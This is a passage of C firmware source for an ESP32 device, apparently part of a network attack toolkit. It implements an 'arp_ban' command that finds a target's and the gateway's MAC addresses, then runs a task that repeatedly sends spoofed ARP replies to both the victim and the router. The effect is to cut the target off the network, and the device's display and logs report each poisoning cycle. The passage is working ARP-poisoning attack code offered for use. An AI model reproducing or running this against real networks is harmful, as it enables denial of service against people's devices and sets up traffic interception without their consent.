brokali/projectZeroTouch/ESP32C5/main/main.c
        // Packet 2: To ROUTER - "Victim IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_gateway_mac,       // Eth dst: router
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_target_ip.addr,    // ARP sender IP: victim (spoofed!)
                       arp_ban_gateway_mac,       // ARP target MAC: router
                       arp_ban_gateway_ip.addr);  // ARP target IP: router
        
        arp_cycle++;
        if (arp_cycle % 4 == 0) {
            char arp_l2[64], arp_l3[64], arp_l4[64];
            snprintf(arp_l2, sizeof(arp_l2), "  %02X:%02X:%02X:%02X",
                     arp_ban_target_mac[2], arp_ban_target_mac[3],
                     arp_ban_target_mac[4], arp_ban_target_mac[5]);
            snprintf(arp_l3, sizeof(arp_l3), "  %d.%d.%d.%d",
                     ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
                     ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
            snprintf(arp_l4, sizeof(arp_l4), "  Poison #%lu", (unsigned long)arp_cycle);
            oled_display_update_full("> ARP Ban", arp_l2, arp_l3, arp_l4);
        }
        
        vTaskDelay(pdMS_TO_TICKS(450)); // Total ~500ms cycle
    }
    
    MY_LOG_INFO(TAG, "ARP ban task stopped");
    arp_ban_task_handle = NULL;
    vTaskDelete(NULL);
}

static int cmd_arp_ban(int argc, char **argv) {
    oled_display_update_full("> ARP Ban",
        argc >= 2 ? argv[1] : "  No MAC",
        "  Poison active", "  Blocking...");
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: arp_ban <MAC> [IP]");
        MY_LOG_INFO(TAG, "Example: arp_ban AA:BB:CC:DD:EE:FF 192.168.1.50");
        MY_LOG_INFO(TAG, "If IP is omitted, it will be looked up from ARP table.");
        return 1;
    }
    
    // Check if already running
    if (arp_ban_active || arp_ban_task_handle != NULL) {
        MY_LOG_INFO(TAG, "ARP ban already running. Use 'stop' first.");
        return 1;
    }
    
    // Check if connected to AP
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }
    
    // Parse MAC address
    if (!parse_mac_address(argv[1], arp_ban_target_mac)) {
        MY_LOG_INFO(TAG, "Invalid MAC format. Use AA:BB:CC:DD:EE:FF");
        return 1;
    }
    
    // Parse optional IP or try to find it in ARP table
    if (argc >= 3) {
        uint32_t ip = esp_ip4addr_aton(argv[2]);
        if (ip == 0) {
            MY_LOG_INFO(TAG, "Invalid IP address: %s", argv[2]);
            return 1;
        }
        arp_ban_target_ip.addr = ip;
    } else {
        // Try to find IP from ARP table
        bool found = false;
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *netif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                if (memcmp(eth_ret->addr, arp_ban_target_mac, 6) == 0) {
                    arp_ban_target_ip.addr = ip_ret->addr;
                    found = true;
                    MY_LOG_INFO(TAG, "Found IP %d.%d.%d.%d for target MAC",
                               ip4_addr1(ip_ret), ip4_addr2(ip_ret), 
                               ip4_addr3(ip_ret), ip4_addr4(ip_ret));
                    break;
                }
            }
        }
        if (!found) {
            MY_LOG_INFO(TAG, "MAC not found in ARP table. Run 'list_hosts' first or specify IP.");
            return 1;
        }
    }
    
    // Get gateway info
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta_netif, &ip_info);
    
    // Store gateway IP
    arp_ban_gateway_ip.addr = ip_info.gw.addr;
    
    // Find gateway MAC from ARP table
    bool gateway_found = false;
    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == ip_info.gw.addr) {
                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                gateway_found = true;
                break;
            }
        }
    }
    
    if (!gateway_found) {
        // Gateway not in ARP table - send ARP request to get it
        MY_LOG_INFO(TAG, "Gateway MAC not in ARP table, sending ARP request...");
        struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
        if (lwip_netif) {
            ip4_addr_t gw_ip = { .addr = ip_info.gw.addr };
            etharp_request(lwip_netif, &gw_ip);
            vTaskDelay(pdMS_TO_TICKS(1000)); // Wait for response
            
            // Try again
            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *ip_ret;
                struct netif *netif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == ip_info.gw.addr) {
                        memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                        gateway_found = true;
                        break;
                    }
                }
            }
        }
        
        if (!gateway_found) {
            MY_LOG_INFO(TAG, "Could not find gateway MAC. Make sure you're connected to the network.");
            return 1;
        }
    }
    
    MY_LOG_INFO(TAG, "Starting ARP ban attack (bidirectional):");
    MY_LOG_INFO(TAG, "  Target MAC: %02X:%02X:%02X:%02X:%02X:%02X",
               arp_ban_target_mac[0], arp_ban_target_mac[1], arp_ban_target_mac[2],
               arp_ban_target_mac[3], arp_ban_target_mac[4], arp_ban_target_mac[5]);
    MY_LOG_INFO(TAG, "  Target IP: %d.%d.%d.%d",
               ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
               ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
    MY_LOG_INFO(TAG, "  Gateway MAC: %02X:%02X:%02X:%02X:%02X:%02X",
               arp_ban_gateway_mac[0], arp_ban_gateway_mac[1], arp_ban_gateway_mac[2],
               arp_ban_gateway_mac[3], arp_ban_gateway_mac[4], arp_ban_gateway_mac[5]);
    MY_LOG_INFO(TAG, "  Gateway IP: " IPSTR, IP2STR(&ip_info.gw));
    MY_LOG_INFO(TAG, "  Attack: Poisoning BOTH victim and router");
    
    // Start attack task
    arp_ban_active = true;
    BaseType_t result = xTaskCreate(arp_ban_task, "arp_ban", 4096, NULL, 5, &arp_ban_task_handle);
    if (result != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create ARP ban task");
        arp_ban_active = false;
        return 1;
    }
    
